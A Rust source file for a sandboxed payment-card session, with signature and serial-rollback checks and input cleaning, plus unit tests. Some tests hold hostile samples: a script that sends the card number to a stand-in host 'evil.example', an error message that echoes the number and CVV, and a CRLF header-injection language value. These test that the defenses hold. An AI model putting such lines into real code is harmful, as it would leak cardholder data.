use std::sync::Arc;

use serde_json::Value;

use crate::bundle::{self, Bundle, Flow, Keys, Reject};
use crate::card::Card;
use crate::fetch::Fetch;
use crate::guard;
use crate::outcome::{Outcome, Reply};
use crate::sandbox::{self, Inputs, Job, Limits, RunError};
use crate::serial::SerialStore;

const LANGUAGE_LEN: usize = 35;
const FALLBACK_LANGUAGE: &str = "en-US";
const PARAMS_LEN: usize = 16 * 1024;
const TZ_RANGE: std::ops::RangeInclusive<i32> = -840..=840;

#[derive(Clone, Debug)]
pub struct Env {
    pub language: String,
    pub tz_offset: i32,
}

#[derive(Clone)]
pub struct Session {
    inner: Arc<Inner>,
}

struct Inner {
    entry: String,
    flow: Flow,
    script: String,
    hosts: Vec<String>,
    page_hosts: Vec<String>,
    result_url: String,
    params: Value,
    env: Env,
    fetch: Arc<dyn Fetch>,
}

pub fn open(
    bundle: Bundle,
    params: Value,
    env: Env,
    keys: &Keys,
    serials: &SerialStore,
    now: i64,
    fetch: Arc<dyn Fetch>,
) -> Result<Session, Reject> {
    bundle::check(&bundle, keys, now, serials.highest())?;
    if !params.is_object() || params.to_string().len() > PARAMS_LEN {
        return Err(Reject::Params);
    }
    serials
        .record(bundle.serial)
        .map_err(|_| Reject::SerialNotSaved)?;
    Ok(Session {
        inner: Arc::new(Inner {
            entry: bundle.entry,
            flow: bundle.flow,
            script: bundle.script,
            hosts: bundle.allowed_hosts,
            page_hosts: bundle.page_hosts,
            result_url: bundle.result_url,
            params,
            env: Env {
                language: language(&env.language).to_string(),
                tz_offset: if TZ_RANGE.contains(&env.tz_offset) {
                    env.tz_offset
                } else {
                    0
                },
            },
            fetch,
        }),
    })
}

impl Session {
    pub fn flow(&self) -> Flow {
        self.inner.flow
    }

    pub fn entry(&self) -> &str {
        &self.inner.entry
    }

    pub fn takes_page(&self, url: &str) -> bool {
        guard::page_on(url, &self.inner.page_hosts)
    }

    pub fn ends_at(&self, url: &str) -> bool {
        guard::reaches(url, &self.inner.result_url)
    }

    pub async fn submit(&self, card: Card) -> Result<Outcome, RunError> {
        if self.flow() != Flow::CardForm {
            return Err(RunError::Sandbox("flow".into()));
        }
        self.run("submit", Some(card), None).await
    }

    pub async fn result(&self, url: String) -> Result<Outcome, RunError> {
        if !self.ends_at(&url) {
            return Err(RunError::Sandbox("result_url".into()));
        }
        self.run("result", None, Some(url)).await
    }

    async fn run(
        &self,
        action: &'static str,
        card: Option<Card>,
        url: Option<String>,
    ) -> Result<Outcome, RunError> {
        let inner = self.inner.clone();
        tokio::task::spawn_blocking(move || inner.run(action, card, url))
            .await
            .map_err(|_| RunError::Sandbox("worker".into()))?
    }
}

impl Inner {
    fn run(
        &self,
        action: &str,
        card: Option<Card>,
        url: Option<String>,
    ) -> Result<Outcome, RunError> {
        let job = Job {
            script: &self.script,
            inputs: Inputs {
                action,
                params: &self.params,
                language: &self.env.language,
                tz_offset: self.env.tz_offset,
                card: card.as_ref(),
                url: url.as_deref(),
            },
            hosts: &self.hosts,
            fetch: self.fetch.clone(),
            limits: Limits::default(),
        };
        sandbox::run::<Reply>(job)
            .map(|reply| Outcome::read(reply, &self.page_hosts))
            .map_err(|error| redacted(error, card.as_ref()))
    }
}

fn language(raw: &str) -> &str {
    let clean = !raw.is_empty()
        && raw.len() <= LANGUAGE_LEN
        && raw.bytes().all(|b| b.is_ascii_alphanumeric() || b == b'-');
    if clean { raw } else { FALLBACK_LANGUAGE }
}

fn redacted(error: RunError, card: Option<&Card>) -> RunError {
    let (RunError::Script(text), Some(card)) = (&error, card) else {
        return error;
    };
    let clean = card
        .secrets()
        .into_iter()
        .filter(|secret| secret.len() >= 3)
        .fold(text.clone(), |text, secret| text.replace(secret, "***"));
    RunError::Script(clean)
}

#[cfg(test)]
mod tests {
    use serde_json::json;

    use super::*;
    use crate::bundle::tests::{SERIAL, key, keys, sample, signed};
    use crate::testkit::{self, FakeSg, NUMBER, SG_HOSTS, SUCCEEDED};

    fn bundle(serial: i64) -> Bundle {
        let mut bundle = sample("return { state = 'succeeded' }", &SG_HOSTS);
        bundle.serial = serial;
        signed(bundle, &key(1))
    }

    fn fetch() -> Arc<FakeSg> {
        FakeSg::new(SUCCEEDED)
    }

    fn try_open(bundle: Bundle, serials: &SerialStore, now: i64) -> Result<Session, Reject> {
        open(
            bundle,
            testkit::bind_params(),
            testkit::env(),
            &keys(1),
            serials,
            now,
            fetch(),
        )
    }

    #[test]
    fn an_older_bundle_is_refused_after_a_newer_one_was_seen_even_after_a_restart() {
        let serials = testkit::serials("rollback");
        assert!(try_open(bundle(SERIAL + 10), &serials, 1_000).is_ok());
        let after_restart = SerialStore::at(serials_path("rollback"));
        assert_eq!(
            try_open(bundle(SERIAL + 9), &after_restart, 1_000).err(),
            Some(Reject::OldSerial)
        );
        assert!(try_open(bundle(SERIAL + 10), &after_restart, 1_000).is_ok());
        assert!(try_open(bundle(SERIAL + 11), &after_restart, 1_000).is_ok());
        assert_eq!(after_restart.highest(), SERIAL + 11);
    }

    fn serials_path(name: &str) -> std::path::PathBuf {
        std::env::temp_dir()
            .join(format!("pay-card-{name}-{}", std::process::id()))
            .join("serial")
    }

    #[test]
    fn a_contract_2_bundle_opens_over_a_kept_v1_serial() {
        let serials = testkit::serials("over-v1");
        std::fs::write(serials_path("over-v1"), "1763200000").unwrap();
        assert!(try_open(bundle(SERIAL), &serials, 1_000).is_ok());
        assert_eq!(serials.highest(), SERIAL);
    }

    #[test]
    fn a_refused_bundle_does_not_move_the_serial() {
        let serials = testkit::serials("refused");
        let mut forged = bundle(SERIAL + 50);
        forged.script.push(' ');
        assert_eq!(
            try_open(forged, &serials, 1_000).err(),
            Some(Reject::BadSignature)
        );
        assert_eq!(
            try_open(bundle(SERIAL + 5), &serials, 5_000).err(),
            Some(Reject::Expired)
        );
        assert_eq!(serials.highest(), 0);
    }

    #[test]
    fn params_must_be_a_small_object() {
        let serials = testkit::serials("params");
        for params in [
            json!("x"),
            json!([1]),
            json!({"big": "x".repeat(PARAMS_LEN)}),
        ] {
            let opened = open(
                bundle(SERIAL),
                params,
                testkit::env(),
                &keys(1),
                &serials,
                1_000,
                fetch(),
            );
            assert_eq!(opened.err(), Some(Reject::Params));
        }
        assert_eq!(serials.highest(), 0);
    }

    #[tokio::test]
    async fn a_script_that_calls_a_foreign_host_never_sends_the_card() {
        let sg = fetch();
        let script = r#"return http({ url = "https://evil.example/c?n=" .. inputs.card.number })"#;
        let session = testkit::session_with(script, sg.clone(), "foreign");
        let result = session.submit(testkit::card()).await;
        assert_eq!(
            result.err(),
            Some(RunError::Denied(crate::guard::Denied::ForeignHost))
        );
        assert!(sg.seen.lock().unwrap().is_empty());
    }

    #[tokio::test]
    async fn a_script_error_never_echoes_the_card() {
        let script = r#"error("declined " .. inputs.card.number .. " cvv " .. inputs.card.cvv)"#;
        let session = testkit::session_with(script, fetch(), "echo");
        let text = match session.submit(testkit::card()).await {
            Err(RunError::Script(text)) => text,
            other => panic!("{other:?}"),
        };
        assert!(
            !text.contains(NUMBER) && !text.contains(testkit::CVV),
            "{text}"
        );
        assert!(text.contains("declined"));
    }

    #[tokio::test]
    async fn env_is_cleaned_before_the_script_sees_it() {
        let script = "return { state = 'failed', reason = inputs.env.language .. '_' .. inputs.env.tz_offset }";
        let bundle = signed(sample(script, &SG_HOSTS), &key(1));
        let session = open(
            bundle,
            json!({}),
            Env {
                language: "en\r\nX-Evil: 1".into(),
                tz_offset: 99_999,
            },
            &keys(1),
            &testkit::serials("env"),
            1_000,
            fetch(),
        )
        .unwrap();
        assert_eq!(
            session.submit(testkit::card()).await.unwrap(),
            Outcome::failed("en_0")
        );
    }

    #[test]
    fn only_a_clean_language_tag_reaches_the_script() {
        assert_eq!(language("ru-RU"), "ru-RU");
        assert_eq!(language("en\r\nX-Evil: 1"), FALLBACK_LANGUAGE);
        assert_eq!(language(""), FALLBACK_LANGUAGE);
    }

    #[tokio::test]
    async fn result_runs_only_on_the_bundle_result_url() {
        let session = testkit::session_with("return { state = 'pending' }", fetch(), "result-url");
        assert!(
            session
                .result("https://evil.example/app/payment/result".into())
                .await
                .is_err()
        );
        assert_eq!(
            session
                .result("https://pay.example/app/payment/result?result=success".into())
                .await
                .unwrap(),
            Outcome::Pending { reason: None }
        );
    }
}
